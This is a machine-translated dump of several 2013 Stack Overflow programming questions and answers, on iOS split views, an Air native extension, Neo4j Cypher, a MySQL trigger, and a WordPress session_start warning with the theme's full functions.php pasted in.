    // LOAD THE PROJECTS PANEL ROOT VIEW CONTROLLER INTO THE WINDOW
    ProjectsListViewController *projects = [[ProjectsListViewController alloc] init];

    navigationController = [[UINavigationController alloc] initWithRootViewController:projects];

    [window setRootViewController:navigationController];
    [window makeKeyAndVisible];

    return YES;
   } 
```

**项目视图控制器**

```
-(IBAction)loadDetails
{    
    ProjectNavigationController *projectNavPanel = [[ProjectNavigationController alloc] init];
    ProjectDetailController *projectDetailPanel = [[ProjectDetailController alloc] init];
    ProjectSplitViewController *splitRootController = [[ProjectSplitViewController alloc] init];

    [splitRootController setViewControllers:[NSArray arrayWithObjects:projectNavPanel, projectDetailPanel, nil]];

    [[self view] removeFromSuperview];
    [[appDelegate window] setRootViewController:splitRootController];
} 
```

**UISplitViewController 导航**

```
- (void)loadProjects
{
    // LOAD THE PROJECTS LIST BACK INTO VIEW
    ProjectsListViewController *projectsList = [[ProjectsListViewController alloc] init];

    [[[self parentViewController] view] removeFromSuperview];
    [[appDelegate window] setRootViewController:projectsList];
} 
```

现在，我知道这是错误的，不出所料，它会对其他方法产生不利影响。事实上，当我输入这个时，我注意到 Projects 页面在启动时被加载到 navigationController 中，但在 splitViewController 关闭时直接放置在窗口上。任何人都可以通过解释实现这一目标的正确方法来帮助我吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T19:39:20.003

Apple 说 a`UISplitViewController`必须是应用程序中最顶层的视图控制器，**并且它必须在应用程序的整个生命周期中都存在**。正如您所注意到的，如果您忽略这一点，**一切都会中断**。

有一些替代方案不会以这种方式破坏，例如[MGSplitViewController](https://github.com/mattgemmell/MGSplitViewController)。谷歌周围。如果您有时间，您甚至可以自己实现拆分视图控制器并完全控制。

如果您真的想以`UIsplitViewController`“疯狂”的方式使用 Apple，那么您可以将其安装为 root VC（根据 Apple 的要求），并始终将其放在 root 中，然后在其顶部以模态方式显示其他 UI。然后隐藏模态 UI 以使拆分视图控制器出现。不过，这很讨厌和 hacky。

不久前，我问了一个可能感兴趣的相关问题：

[在 UISplitViewController 和其他视图控制器之间切换的最佳方式？](https://stackoverflow.com/questions/4213097/best-way-to-switch-between-uisplitviewcontroller-and-other-view-controllers)

# java - Air Native Extension 中的 Java 性能，如何优化？

> ID：15159302
> 
> 赞同：1
> 
> 时间：2013-03-01T13:48:11.400
> 
> 标签：java, actionscript-3, air, air-native-extension

我有 30 架飞机的模拟器，我想在 Android 手机上运行。

我在 AS3 中编写了整个代码，但我认为如果我将 Java 用作本机扩展，性能会有所提升。

模拟是一个包含 30 个单元的库。模拟计算所有单元之间的距离和旋转。这大约是 870 次迭代，其中包含许多距离和旋转计算。

**我在 Java 上的 ANE 运行速度比我的 AS3 版本慢大约 50 倍。**

问题似乎是多次在 FREArray 上调用 setObjectAt()。我猜这种从 Java 到 AS3 的转换很慢。有没有办法优化将变量从 Java 恢复到 AS3？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-03T12:38:57.547

我猜想 AS3 性能与标准 Java 性能没有太大区别，当用作本机扩展时。

但是，感谢 Android NDK，它允许我在 C++ 中重建库，我的性能并没有提高大约 20 倍。

因此，如果您正在寻找 AS3 在 Android 上的性能优势：使用 NDK。

# subquery - 我如何在 Neo4j 中复制这个 SQL 子查询

> ID：15159307
> 
> 赞同：1
> 
> 时间：2013-03-01T13:48:23.833
> 
> 标签：subquery, neo4j, cypher

我是 Neo4j 和图形数据库的新手，但我有关系数据库的背景。

我的问题是关于如何在 Neo4j 中有效地复制 SQL Server 查询的建议。

我正在开始一个我认为适合 Neo4j 的新项目，因为我必须存储许多朋友的朋友类型的关系。我正在使用 Neo4j 1.8.1 和 C# 来编写我的应用程序

我项目的一部分有一个结构类似于 Twitter 的部分，这就是我需要帮助的地方。

我将使用 Twitter 类比来解释我的问题：

我有一个文本 blob（推文）列表，每个 blob 可以属于 0、1 或多个类别（哈希标签）。与 Twitter 不同，我也有链接到 0、1 或多个类别的用户。

我认为图表看起来像这样：

T = 文本 blob 节点，C = 类别节点，U = 用户节点

```
T-------C-------U
 \_____/ \_____
 /     \       \
T-------C-------U
 \_____
       \
T-------C-------U
  _____/ \_____
 /             \
T               U 
```

当应用程序运行时，我估计将有大约 10,000,000 条记录（我可能会归档更多），大约 100 个类别和大约 1000 个用户。

目前我有一个简单的 SQL Server 数据库来测试这个：

```
     __________ ______________ ___________ ______________ ________
    |正文 | |文本类别 | |类别 | |用户类别 | |用户 |
    |-----------| |---------------| |-----------| |---------------| |--------|
    |TextId |-----|TextId |------|CategoryId |-----|UserId |----|UserId |
    |正文 | |类别 ID | |姓名 | |类别 ID | |姓名 |
    |添加日期 | |添加日期 | |-----------| |---------------| |--------|
    |-----------| |---------------|

```

通过将 DateAdded 字段从 Text 表复制到 TextCategory 表并向 2 个链接表添加索引，我可以运行以下查询以返回属于用户订阅的类别的所有文本项，按日期排序：

```
SELECT t.*
FROM Text t
    INNER JOIN tc TextCategory ON tc.TextId = b.TextId
WHERE tc.CategoryId IN
(
    SELECT CategoyId
    FROM UserCategory
    WHERE UserId = @UserId
)
ORDER BY tc.AddedDate 
```

实际上，我会对结果进行分页，但为简单起见，我将其省略了。

如何有效地在我的 Neo4j 数据库中复制此查询？在 Cypher 中可以进行这样的子查询吗？

如果我使用这样的东西：

```
u-[:SUBSCRIBES_TO]->c<-[:BELONGS_TO]-t 
```

（我的 Cypher 技能还很幼稚）

我可以扫描文本节点，但无法对用户使用索引。我最终会检查每个文本节点以查看它是否链接到用户。

如果我扫描与用户链接的所有关系，我将无法利用文本节点上的日期排序索引来页面结果，例如避免扫描所有节点以找到最早的 10 个。

正如我所提到的，我来自 RDBMS 背景，我仍在以关系数据库的方式思考这个问题，所以如果我的理论有误，请告诉我。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T14:18:01.357

I think this translates quite directly to neo. You could put the user nodes in an index and then query like you already stated:

```
start u=users(<USERID>) match u-[:SUBSCRIBES_TO]->c<-[:BELONGS_TO]-t return t order by t.AddedDate skip(<SKIPPED>) limit(<PAGESIZE>) 
```

Unless i missed something you answered it already.

# flash - youtube 播放器如何工作

> ID：15159309
> 
> 赞同：3
> 
> 时间：2013-03-01T13:48:34.323
> 
> 标签：flash, youtube

我最感兴趣的是视频质量。

他们是将每个视频文件转换为许多单独的视频文件，还是在用户观看视频时即时转换文件以节省空间？所以基本上是如何制作不同的视频质量的。

此外，哪些视频格式适用于 Flash？哪一个是最常用的？

如果我使用 HTML5 而不是 Flash，我会牺牲什么？我看到 youtube 正在切换到 HTML5，他们的播放器是否可以在所有浏览器中运行，甚至 IE7？

制作 youtube flash 或 HTML5 播放器副本有多难？

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T13:54:03.063

每个上传的视频都会转换成几个不同的 MIME 类型。HTML5 允许您轻松添加视频，而无需您自己的自定义 Flash 播放器。您还可以使用每个浏览器中的普通元素制作自己的播放器。尽管并非所有浏览器都支持 HTML5，但它正变得越来越流行，并且（希望）很快会在所有浏览器中实现。我不完全确定哪些视频格式适用于 Flash，但我只能假设所有格式都适用。我可以在一天内制作一个 html5 youtube 播放器的复制品。

MIME 类型 - Mime 类型本质上是不同的文件类型。它们是不同的文件。例如，我有一个 mp3 文件，我可以将其转换为 wav 文件和 ogg 文件，我将拥有三种不同的 MIME 类型。[阅读本文以获取有关 Mime 类型的更多信息](http://en.wikipedia.org/wiki/Internet_media_type)

# jakarta-ee - jboss-eap-5.1 的示例应用程序

> ID：15159310
> 
> 赞同：1
> 
> 时间：2013-03-01T13:48:36.410
> 
> 标签：jakarta-ee, netbeans, jboss

谁能建议我使用**NetBeans**在**JBoss中工作的****Java EE（带有 EJB 会话和实体）示例应用程序**。

# c# - 以编程方式返回

> ID：15159335
> 
> 赞同：4
> 
> 时间：2013-03-01T13:50:07.143
> 
> 标签：c#, visual-studio, windows-phone-7, windows-phone-8

在我的应用程序中，用户从页面 A 转到页面 B。

有没有办法以编程方式模拟后退按钮按下？我在页面 B 上有一个按钮，当用户单击它时，我想返回页面 A。我不想使用`NavigationService`并导航到页面 A，我想返回页面 A，就好像用户单击了一样在硬件后退按钮上。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2013-03-01T13:52:23.973

尽管您说您不想使用它，但[NavigationService.GoBack 方法](http://msdn.microsoft.com/en-US/library/windowsphone/develop/system.windows.navigation.navigationservice.goback%28v=vs.105%29.aspx)是要走的路：

```
if (this.NavigationService.CanGoBack)
{
    this.NavigationService.GoBack();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-11-09T05:03:45.803

Michaël Hompus 的答案的一点补充——在 UWP 上，`CanGoBack`属性和`GoBack`方法都位于 Page.Frame 中。

# mysql - 语法翻译

> ID：15159339
> 
> 赞同：0
> 
> 时间：2013-03-01T13:50:24.020
> 
> 标签：mysql

这是我的代码：

```
CREATE TRIGGER Zmiana_kategorii
ON Hotele
AFTER UPDATE
AS
BEGIN
DECLARE @stara smallint, @nowa smallint
    IF COL_LENGTH('deleted', 'IloscGwiazdek')
    BEGIN
    SET @stara=(SELECT IloscGwiazdek FROM deleted)
    SET @nowa=(SELECT IloscGwiazdek FROM inserted)
        IF(@stara<@nowa)
        BEGIN
        print 'Powiadom następujących klientów o zmianie klasy hotelu'
        declare @data date
        SET @data=(CONVERT (date, GETDATE()))
        SELECT KlientID FROM Rezerwacje Where @data<DataPrzyjazdu
        END
    END

END 
```

有人能告诉我语法有什么问题吗？我是第一次使用 MYSQL 我不知道这有什么问题...

这是错误：在 Hotele 更新后开始声明 @stara smallint，@nowa smallint ' 在第 2 行“这是错误

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:21:13.990

至少一个问题是你没有`THEN`在你的`IF`条件之后包含。例如：

```
IF (@stara<@nowa) THEN
BEGIN
    -- ...
END 
```

另一个问题是您的`CREATE TRIGGER`元素顺序错误。它应该是：

```
CREATE TRIGGER Zmiana_kategorii
AFTER UPDATE
ON Hotele 
```

请注意，`AFTER UPDATE`在`ON`. 这似乎解决了您的具体问题。

最后，MySQL 没有`PRINT`命令，所有变量都必须在块的开头声明`BEGIN`，在任何其他语句之前。

请阅读整个页面并了解发生了什么：[http ://dev.mysql.com/doc/refman/5.0/en/create-trigger.html](http://dev.mysql.com/doc/refman/5.0/en/create-trigger.html)

如果你理解语法，那么你可以自己调试它。这些类型的简单问题不应该需要社区帮助（尽管有时额外的一双眼睛可以捕捉到明显的错误）。

# php - 警告：session_start() [function.session-start]：

> ID：15159341
> 
> 赞同：1
> 
> 时间：2013-03-01T13:50:36.263
> 
> 标签：php, wordpress

我正在为一个网站[http://kidneyprostate.com/index.php](http://kidneyprostate.com/index.php)工作。在这里，我为登录页面和我在 wordpress 中工作过的其他页面创建了一个页面。哪里也有博客。

现在问题从这里开始。我在我的 index.php 中调用我的博客文章和档案的摘录。博客文章和档案显示完美，但上面显示错误

警告：session_start() [function.session-start]：无法发送会话缓存限制器 - 已在 /home/kidneypr/public_html/kidney-prostate 中发送标头（输出开始于 /home/kidneypr/public_html/index.php:316） .com/wp-content/themes/suits/functions.php 第 20 行

我的 index.php 在根文件夹中，所有 wordpress 页面都在 public_html/kidney-prostate.com/ 中。

这是我的 index.php

```
<div style=" width:212px;height:410px; background:transparent#fff;">
<div class="prefix">

<?php
require('./kidney-prostate.com/wp-blog-header.php');
?>

<?php
$posts = get_posts('numberposts=3&order=ASC&orderby=post_title');
foreach ($posts as $post) : start_wp(); ?>
<span style="font-weight:bold; position:relative; padding-bottom:5px; "><?php the_date(); echo "<br />"; ?></span>
<a href="<?php the_permalink() ?>" rel="bookmark" title="Permanent Link to <?php the_title(); ?>"><?php the_title(); ?></a>  

 <?php  echo "<br/>";?>
<?php
endforeach;
?>
</div>

<div class="prefix">
<span style="font-size:22px; font-style:normal; font-weight:bold;">Archives</span>
<?php wp_get_archives( array( 'type' => 'monthly' ) );  ?>

 </div>

</div> 
```

我的function.php如下：

```
<?php

if ( ( $pagenow == "themes.php" ) && current_user_can('administrator') && isset( $_GET['activated'] ) && ( $_GET['activated']=='true' ) ) {
    if (!include_once( get_template_directory() . '/inc/activation.php' )) {
        $stylesheet = get_option( 'theme_switched' );
        switch_theme( $stylesheet, $stylesheet );
        if ( file_exists( get_template_directory() . '/inc/activation.php' ) ) {
            $error_message[]="PHP hasn't access to file /inc/activation.php. Check the file permissions and try again please.";
        } else {
            $error_message[]="File /inc/activation.php doesn't exists. Try to upload the theme again.";
        }
        $message="<h2>The theme wasn't activated by following reasons:</h2><ul><li>".implode("</li><li>",$error_message)."</li></ul>"."Your theme was switched back to ".$stylesheet.".";
        wp_die($message,'',array('back_link'=>"/wp-admin/themes.php"));
    }
}

if (!session_id()) {
    session_start();
}
if (!include_once (get_template_directory()."/inc/library.php") )wp_die("Cannot include file /inc/library.php.");
$settingsfile='settings';
$defparamsfile="defaults";
$default='global|slider|layout|seo|translations';
    $rightargs = array(
        'before_widget' => '<div class="widget %2$s"><div class="inner">',
        'after_widget' => '</div></div>',
        'before_title' => '<div class="caption"><h3>',
        'after_title' => '</h3></div>'
    );

$footerargs = array(
        'before_widget' => '<div>',
        'after_widget' => '</div>',
        'before_title' => '<div class="caption"><h3>',
        'after_title' => '</h3></div>'
    );
if ( function_exists('register_sidebar') ) {
    $sidebar='default';
    register_sidebar(array(
        'name' => 'Right Sidebar',
        'id' => 'right_sidebar',
        'description' =>'The right sidebar widget area',
        'before_widget' => '<div id="%1$s" class="widget %2$s"><div class="inner">',
        'after_widget' => '</div></div>',
        'before_title' => '<div class="caption" ><h3>',
        'after_title' => '</h3></div>'
    ));
    register_sidebar(array(
        'name' => 'Left Sidebar',
        'id' => 'left_sidebar',
        'description' =>'The left sidebar widget area',
        'before_widget' => '<div id="%1$s" class="widget %2$s"><div class="inner">',
        'after_widget' => '</div></div>',
        'before_title' => '<div class="caption"><h3>',
        'after_title' => '</h3></div>'
    ));

    $$sidebar='bottom';
    register_sidebar(array(
        'name' => 'Footer 1',
        'id' => 'footer_1',
        'description' => 'The primary sidebar widget area',
        'before_widget' => '<div id="%1$s" class="widget %2$s"><div class="inner">',
        'after_widget' => '</div></div>',
        'before_title' => '<div class="caption"><h3>',
        'after_title' => '</h3></div>'
    ));
    register_sidebar(array(
        'name' => 'Footer 2',
        'id' => 'footer_2',
        'description' => 'The primary sidebar widget area',
        'before_widget' => '<div id="%1$s" class="widget %2$s"><div class="inner">',
        'after_widget' => '</div></div>',
        'before_title' => '<div class="caption"><h3>',
        'after_title' => '</h3></div>'
    ));
    register_sidebar(array(
        'name' => 'Footer 3',
        'id' => 'footer_3',
        'description' => 'The primary sidebar widget area',
        'before_widget' => '<div id="%1$s" class="widget %2$s"><div class="inner">',
        'after_widget' => '</div></div>',
        'before_title' => '<div class="caption"><h3>',
        'after_title' => '</h3></div>'
    ));
    register_sidebar(array(
        'name' => 'Tabs',
        'id' => 'tabs_sidebar',
        'description' => 'The primary sidebar widget area',
        'before_widget' => '<div id="%1$s" class="widget %2$s"><div class="inner">',
        'after_widget' => '</div></div>',
        'before_title' => '<span class="caption">',
        'after_title' => '</span>'
    ));
}
$settings=$default;
$SMTheme=new SMTheme;
include_once get_template_directory()."/inc/widgets/facebook.php";
include_once get_template_directory()."/inc/widgets/banners.php";
include_once get_template_directory()."/inc/widgets/comments.php";
include_once get_template_directory()."/inc/widgets/posts.php";
include_once get_template_directory()."/inc/widgets/social-profiles.php";
include_once get_template_directory()."/inc/widgets/video.php";
include_once get_template_directory()."/inc/widgets/flickr.php";
include_once get_template_directory()."/inc/widgets/tabs.php";
if ($_SESSION['commentinput']=='') {
    $_SESSION['commentinput']=substr(md5(rand(1,234234)),0,5);
}
if (isset($_POST[$_SESSION['commentinput']])) {
    $_POST['comment']=$_POST[$_SESSION['commentinput']];
}
if (function_exists('add_theme_support')) {
    add_theme_support('automatic-feed-links');
    add_theme_support('menus');
    add_theme_support( 'post-thumbnails' ); 
    set_post_thumbnail_size( $SMTheme->get( 'layout', 'imgwidth' ), $SMTheme->get( 'layout', 'imgheight' ) , true );
}

if ( function_exists( 'register_nav_menu' ) ) {
    register_nav_menu( 'sec-menu', 'Top Menu' );
    register_nav_menu( 'main-menu', 'Main Menu' );

}

    if ( current_user_can('administrator') ) {
        include_once (get_template_directory()."/inc/administrator.php");
        $APage = new AdminPage();
    }

    $SMTheme->prepare_func('right_sidebar', 'show_right_sidebar_widgets');
    $SMTheme->prepare_func('footer_1', 'show_footer_1_widgets');
    $SMTheme->prepare_func('footer_2', 'show_footer_2_widgets');
    $SMTheme->prepare_func('footer_3', 'show_footer_3_widgets');
    $SMTheme->prepare_func('tabs_sidebar', 'show_tabs_sidebar_widgets');

    function show_tabs_sidebar_widgets() {
        $rightargs=array( 'before_widget' => '<div class="tab_widget widget_categories"><div class="inner">',
        'after_widget' => '</div></div>',
        'before_title' => '<span class="caption">',
        'after_title' => '</span>');
        $instance['hierarchical']='1';
        the_widget('WP_Widget_Categories', $instance, $rightargs);
        $rightargs=array( 'before_widget' => '<div class="tab_widget widget_recent_entries"><div class="inner">',
        'after_widget' => '</div></div>',
        'before_title' => '<span class="caption">',
        'after_title' => '</span>');
        unset($instance);
        the_widget('WP_Widget_Recent_Posts', $instance, $rightargs);
    }

    function show_right_sidebar_widgets() {
        global $rightargs;
        $rightargs['before_widget'] = '<div class="widget widget_search"><div class="inner">';
        the_widget('WP_Widget_Search', $instance, $rightargs);
        $rightargs['before_widget'] = '<div class="widget widget_posts"><div class="inner">';
        $instance['display_featured_image']=1;
        $instance['title']='Recent Posts';
        $instance['display_title']=1;
        $instance['excerpt_length']=120;
        the_widget('Posts', $instance, $rightargs);
        $rightargs['before_widget'] = '<div class="widget widget_comments"><div class="inner">';
        $instance = array(
            'title' => 'Recent Comments',
            'comments_number' => '5',
            'display_author' => 'true',
            'display_comment' => 'true',
            'display_avatar' => 'true',
            'read_more_text' => '&raquo;',
            'comment_length' => '26',
            'avatar_size' => '32',
            'avatar_align' => 'alignleft'
        );
        the_widget('Comments', $instance, $rightargs);
        unset($instance);
        $instance = array(
        'width' =>'272',
        'title' => 'Video',
        'videos' => array(
                array(
                    'title' => 'The Mountain', 
                    'url' => 'http://vimeo.com/22439234/', 
                    'type' => 'vimeo', 
                    'videoid' => '22439234'
                ),
                array(
                    'title' => 'Amazing nature scenery', 
                    'url' => 'http://www.youtube.com/watch?v=6v2L2UGZJAM', 
                    'type' => 'youtube', 
                    'videoid' => '6v2L2UGZJAM'
                )
            )
        );
        $rightargs['before_widget'] = '<div class="widget widget_video"><div class="inner">';
        the_widget('VideoFeed', $instance, $rightargs);
        unset($instance);
        $rightargs['before_widget'] = '<div class="widget widget_banners"><div class="inner">';
        $instance = array(
            'randomize' => '',
            'count' => '3',
            'title' => '',
            'banners' => array(
                '<a href="#"><img src="' . get_template_directory_uri()   . '/images/smt/banner260.gif" alt="" title="" /></a>',
                '<a href="#"><img src="' . get_template_directory_uri()   . '/images/smt/banner125.gif" alt="" title="" /></a>',
                '<a href="#"><img src="' . get_template_directory_uri()   . '/images/smt/banner125.gif" alt="" title="" /></a>'
            )
        );
        the_widget('Banners', $instance, $rightargs);
        unset($instance);
        $instance = array(
            'title' => 'Flickr',
            'userid' => '80789124@N02',
            'width' => '55'
        );
        $rightargs['before_widget'] = '<div class="widget widget_flickr"><div class="inner">';
        the_widget('Flickr', $instance, $rightargs);
        unset($instance);
        $rightargs['before_widget'] = '<div class="widget widget_tag_cloud"><div class="inner">';
        the_widget('WP_Widget_Tag_Cloud', $instance, $rightargs);
        $instance = array(
            'effect' => 'fadeIn'
        );
        $rightargs['before_widget'] = '<div class="widget widget_tabs"><div class="inner">';
        the_widget('Tabs', $instance, $rightargs);
    }
function show_footer_1_widgets() {
        global $footerargs;
        $instance = array(
            'title' => 'Calendar'
        );
        the_widget('WP_Widget_Calendar', $instance, $footerargs);

    }
    function show_footer_2_widgets() {
        global $footerargs;
        the_widget('WP_Widget_Tag_Cloud', $instance, $footerargs);
    }
    function show_footer_3_widgets() {
        global $footerargs;
        $instance= array(
            'width' =>'32',
            'title' => 'Social Profiles',
            'profiles' => array(
            array('id'=>'twitter', 'title' => 'Twitter', 'url' => 'https://twitter.com/agpsa4', 'button' => get_template_directory_uri() . '/images/social-profiles/twitter.png'),
            array('id'=>'facebook','title' => 'Facebook', 'url' => 'http://facebook.com/', 'button' => get_template_directory_uri() . '/images/social-profiles/facebook.png'),
            array('id'=>'gplus','title' => 'Google Plus', 'url' => 'https://plus.google.com/', 'button' => get_template_directory_uri() . '/images/social-profiles/gplus.png'),
            array('id'=>'linkedin','title' => 'LinkedIn', 'url' => 'http://www.linkedin.com/', 'button' => get_template_directory_uri() . '/images/social-profiles/linkedin.png'),
            array('id'=>'email','title' => 'Email', 'url' => 'mailto:debadrita@damiracle.com', 'button' => get_template_directory_uri() . '/images/social-profiles/email.png')
            )
        );
        $footerargs['before_widget'] = '<div class="widget_social_profiles">';
        the_widget('SocialProfiles', $instance, $footerargs);
        $footerargs['before_widget'] = '<div>';
        unset($instance);
        $instance['title']='Dr. Amit Ghose';
        $instance['text']='<a href="http://kidneyprostate.com/index1.html">www.kidneyprostate.com</a>';
        the_widget('WP_Widget_Text', $instance, $footerargs);

    }

    function smtheme_excerpt($args='', $postid=''){
        global $post, $SMTheme;
            if ((int)$postid==0)$p=$post;
            else $p=get_post($postid);
            parse_str($args, $i);
            $echo = isset($i['echo'])?true:false;
            if ( isset($i['maxchar']) ) {
                $maxchar=(int)trim($i['maxchar']);
                $content = $p->post_content;
                $content = apply_filters('the_content', $content);
            } else {
                if ( $p->post_excerpt ) {
                    $content = $p->post_excerpt;
                } else {
                    $content = $p->post_content;
                    $content = apply_filters('the_content', $content);
                    $maxchar=($SMTheme->get( 'layout','cuttxton' ))?$SMTheme->get( 'layout','cuttxt' ):0;
                    $maxchar=(strpos($content, '<!--more-->'))?strpos(preg_replace('/<.*?>/', '', preg_replace('/<!--more-->/','@smt_readmore_tag',$content)), '@smt_readmore_tag'):$maxchar;
                }
            }
            if (!$maxchar||strlen(preg_replace('/<.*?>/', '', $content)) <= $maxchar) {
                if ($echo) print $content;
                else return $content;
            } else {
                preg_match_all('/(<.+?>)?([^<>]*)/s', $content, $lines, PREG_SET_ORDER);
                $total_length=0;
                $open_tags = array();
                $truncate = '';
                foreach ($lines as $line_matchings) {
                    if (!empty($line_matchings[1])) {
                        if (preg_match('/^<(\s*.+?\/\s*|\s*(img|br|input|hr|area|base|basefont|col|frame|isindex|link|meta|param)(\s.+?)?)>$/is', $line_matchings[1])) {
                        } else if (preg_match('/^<\s*\/([^\s]+?)\s*>$/s', $line_matchings[1], $tag_matchings)) {
                            $pos = array_search($tag_matchings[1], $open_tags);
                            if ($pos !== false) {
                                unset($open_tags[$pos]);
                            }
                        } else if (preg_match('/^<\s*([^\s>!]+).*?>$/s', $line_matchings[1], $tag_matchings)) {
                            array_unshift($open_tags, strtolower($tag_matchings[1]));
                        }
                        $truncate .= $line_matchings[1];
                    }
                    $content_length = strlen(preg_replace('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', ' ', $line_matchings[2]));

                    if ($total_length+$content_length > $maxchar) {

                        $left = $maxchar - $total_length;
                        $entities_length = 0;
                        if (preg_match_all('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', $line_matchings[2], $entities, PREG_OFFSET_CAPTURE)) {
                            foreach ($entities[0] as $entity) {
                                if ($entity[1]+1-$entities_length <= $left) {
                                    $left--;
                                    $entities_length += strlen($entity[0]);
                                } else {
                                    break;
                                }
                            }
                        }
                        $truncate .= preg_replace('/(.*)\.[^\.]*$/s', "$1",mb_substr($line_matchings[2], 0, $left+$entities_length, 'utf-8'))."...";
                        break;
                    } else {
                        $truncate .= $line_matchings[2];
                        $total_length += $content_length;
                    }
                    if($total_length>= $maxchar) {
                        break;
                    }
                }

                foreach ($open_tags as $tag) {
                    $truncate .= '</' . $tag . '>';
                }
                $truncate=preg_replace('/<p([^>])*>(&nbsp;)?<\/p>/', '', $truncate);
                if ($echo) return print $truncate;
                else return $truncate;
            }
        return;
    }  
    function smt_menu($a) {
        $a=preg_replace("/<ul\sclass='children'>/", "<ul class='children'$2><div class='transparent'></div><div class='inner'>", $a);
        $a=preg_replace('/<ul\sclass="sub-menu">/', "<ul class='sub-menu'><div class='transparent'></div><div class='inner'>", $a);
        $a=preg_replace("/<\/ul>/", "</div></ul>", $a);
        return $a;
    }
    add_filter('wp_list_categories', 'smt_menu');
    add_filter('wp_list_pages', 'smt_menu');
    add_filter('wp_nav_menu_items', 'smt_menu');
    function block_main_menu() {
    global $SMTheme;
        ?>
         <div class="menu-primary-container">
            <ul class="menus menu-primary">
                <li <?php if(is_home() || is_front_page()) { ?>class="current_page_item"<?php } ?>><a href="<?php echo home_url(); ?>/"><?php echo $SMTheme->_(  'homelink' );?></a></li>
                <?php wp_list_categories('title_li=&'); ?>
            </ul>
        </div>
        <?php
    }

    function block_sec_menu() {
        ?><div class='menu-topmenu-container'><ul class="menus">
                <?php wp_list_pages('title_li=&'); ?>
            </ul></div>
        <?php
    }

function addGMap($atts, $content = null) {

        extract(shortcode_atts(array( "addr" => '', "mzoom" => '16' ), $atts));
        $id='map_canvas'.mktime().rand(0,1000);
        return "
        <div class='googlemap'><div id='".$id."' style='width: 100%; height: 300px;'></div></div>
        <script>jQuery(function(){loadGMap('".$addr."', '".$id."', ".$mzoom.", '".$content."')});</script>
        ";

}
add_shortcode('gmap', 'addGMap');

function addYouTube($atts, $content = null) {
        extract(shortcode_atts(array( "id" => '' ), $atts));
        return '<p style="text-align:center;display:block;overflow:hidden;clear:left">
        <a href="http://www.youtube.com/watch?v='.$id.'" target="_blank" alt="'.$id.'" class="youtube">
        <img src="http://img.youtube.com/vi/'.$id.'/0.jpg" width="90%" height="" />
        </a></p><script>loadYouTube();</script>';
}
add_shortcode('youtube', 'addYouTube');

function addVimeo($atts, $content = null) {
        extract(shortcode_atts(array( "id" => '' ), $atts));
        $videoinf = unserialize(file_get_contents("http://vimeo.com/api/v2/video/".$id.".php"));
        return '<p style="text-align:center;display:block;overflow:hidden;">
        <a href="http://vimeo.com/'.$id.'" target="_blank" alt="'.$id.'" class="vimeo">
        <img alt="" src="'.$videoinf[0]['thumbnail_large'].'" width="90%">
        </a></p><script>loadVimeo();</script>';
}
add_shortcode('vimeo', 'addVimeo');

function addTooltips($atts, $content = "") {
        extract(shortcode_atts(array( "tiptext" => '' ), $atts));
        return '<span class="tooltip" title="'.$tiptext.'">'.$content.'<span>'.$tiptext.'</span></span>';
}
add_shortcode('tooltip', 'addTooltips');

function add_smpanel() {
   if ( ! current_user_can('edit_posts') && ! current_user_can('edit_pages') )
     return;
   if ( get_user_option('rich_editing') == 'true') {
     add_filter('mce_external_plugins', 'add_smpanel_tinymce_plugin');
     add_filter('mce_buttons_3', 'register_smpanel');
   }
}

add_action('init', 'add_smpanel');
function register_smpanel($buttons) {
   array_push($buttons, "youtube","vimeo","|","btns","cols","tooltips","highlights", "gmap");
   return $buttons;
}

function add_smpanel_tinymce_plugin($plugin_array) {
   $plugin_array['smpanel'] = get_template_directory_uri() .'/js/editor_plugin.js';
   return $plugin_array;
}

function my_refresh_mce($ver) {
  $ver += 3;
  return $ver;
}
add_editor_style( 'css/editor.css' );
add_filter( 'tiny_mce_version', 'my_refresh_mce');

if ( ! function_exists('tdav_css') ) {
    function tdav_css($wp) {
        $wp .= ','.get_template_directory_uri().'/css/shortcode.css ';
    return $wp;
    }
}
add_filter( 'mce_css', 'tdav_css' );
function smtheme_topic_count_text($count) {
    global $SMTheme;
    return sprintf( _n($SMTheme->_( 'altposts' ), $SMTheme->_( 'altpostss' ), $count), number_format_i18n( $count ) );
}
function smtheme_tag_cloud() {
    $args['topic_count_text_callback']='smtheme_topic_count_text';
    return $args;
}
add_filter('widget_tag_cloud_args', 'smtheme_tag_cloud');

add_filter( 'gettext', 'theme_change_comment_field_names', 20, 3 );
/**
 * Change comment form default field names.
 *
 * @link http://codex.wordpress.org/Plugin_API/Filter_Reference/gettext
 */
function theme_change_comment_field_names( $translated_text, $text, $domain ) {
global $SMTheme;
        switch ( $translated_text ) {

            case 'View all posts filed under %s' :

                $translated_text = $SMTheme->_( 'altcats' );
                break;

        }
    return $translated_text;
}

add_action('admin_init', 'single_content_layout', 1); 

function single_content_layout() {  
    add_meta_box( 'single_content_layout', 'Content layout', 'single_content_layout_func', 'post', 'side', 'high'  );  
    add_meta_box( 'single_content_layout', 'Content layout', 'single_content_layout_func', 'page', 'side', 'high'  );  
}

function single_content_layout_func($post) {
    global $APage;

        $layouts=$APage->PageOptions['layout']['content']['pagelayout']['params'];
        $selected = get_post_meta($post->ID, 'single_layout', 1);
    ?>
        <select name='single_layout' style='width:100%'>
            <option value='0'>Default</option>
            <?php

            foreach ( $layouts as $key=>$value ) {
                echo "<option value='".$key."' ".selected( $selected, $key ).">".$value."</option>";
            }
            ?>
        </select>
    <?php
}

add_action('save_post', 'single_content_layout_update', 0);  
function single_content_layout_update( $post_id ){  

    if ( defined('DOING_AUTOSAVE') && DOING_AUTOSAVE  ) return false; 

    if ( !current_user_can('edit_post', $post_id) ) return false; 

    if( !isset($_POST['single_layout']) ) return false;

    $_POST['single_layout'] = (int)$_POST['single_layout'];
    update_post_meta($post_id, 'single_layout', $_POST['single_layout']);

    return $post_id;  
}  

?> 
```

我的 .htaccess 文件是

```
# BEGIN WordPress
<IfModule mod_rewrite.c>
ErrorDocument 404 /index.php?error=404
RewriteEngine On
RewriteBase /
RewriteCond %{REQUEST_FILENAME} !-f
